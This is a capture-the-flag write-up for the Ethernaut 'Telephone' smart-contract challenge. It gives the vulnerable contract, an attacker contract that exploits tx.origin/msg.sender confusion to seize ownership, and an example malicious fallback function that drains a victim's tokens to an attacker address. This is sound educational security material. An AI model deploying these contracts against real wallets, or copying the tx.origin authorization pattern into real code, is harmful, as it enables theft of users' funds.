contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }

## Solution

1. Get instance address.  
`contract.instance`

2. Using Remix, deploy the `StealYourPhone.sol`.  
```javascript
pragma solidity ^0.4.18;

contract StealYourPhone {
    function changeOwner(address _telephone) {
        Telephone(_telephone).changeOwner(msg.sender);
    }
}
```

3. Invoke the `changeOwner` method and pass instance address as a parameter  
This works because the `tx.origin` will be the user that invoked the transaction, while the `msg.sender` will be the last contract that forwarded the function call.  

4. Check contract owner.  
`await contract.owner()`

4. Submit instance ðŸŽ‰

## Lesson
While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).  
An example of a possible attack is outlined below.  
1. Use tx.origin to determine whose tokens to transfer, e.g.
```javascript
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```
2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.  
```javascript
function () payable {
  token.transfer(attackerAddress, 10000);
}
```
3. In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
